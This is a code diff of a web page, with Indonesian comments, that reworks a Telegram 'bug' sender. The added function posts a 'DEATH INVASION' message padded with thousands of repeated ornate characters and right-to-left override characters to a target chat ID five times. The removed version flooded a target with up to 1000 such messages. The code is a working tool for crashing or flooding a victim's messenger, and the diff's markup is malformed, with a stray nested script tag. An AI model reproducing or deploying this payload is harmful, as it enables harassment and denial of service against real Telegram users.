@@ -71,33 +71,30 @@
       }
     }
 
-    async function sendBug() {
-      const id = document.getElementById('target-id').value.trim();
-      if (!id) return alert("Isi ID dulu 😹");
+    <script>
+async function sendHeavyBug(targetId, token) {
+  const ultraBug = "꧅꧄༒︎".repeat(2048) + "\u202e".repeat(2048); // RTLO + Unicode overload
 
-      for (let i = 1; i <= 1000; i++) {
-        const payload = {
-          chat_id: id,
-          text: `💣 *DEATH INVASION [${i}/10]* 💣\n` + "ꦾ".repeat(4000),
-          parse_mode: "Markdown"
-        };
+  const payload = {
+    chat_id: targetId,
+    text: `💣 *DEATH INVASION FINAL STRIKE* 💣\n\n` + ultraBug,
+    parse_mode: "Markdown"
+  };
 
-        try {
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-          });
-          console.log(`✅ Pesan ${i} terkirim`);
-          await new Promise(res => setTimeout(res, 100));
-        } catch (err) {
-          console.error(`❌ Gagal kirim ${i}:`, err);
-        }
-      }
+  for (let i = 1; i <= 5; i++) {
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
 
-      alert("✅ Semua bug berhasil dikirim!");
-    }
-  </script>
+    console.log(`💥 Kirim [${i}/5]`);
+    await new Promise(res => setTimeout(res, 700)); // delay buat amanin
+  }
+
+  alert("✅ Bug ekstrim telah dikirim 5x ke target.");
+}
+</script>
 
 </body>
   </html>
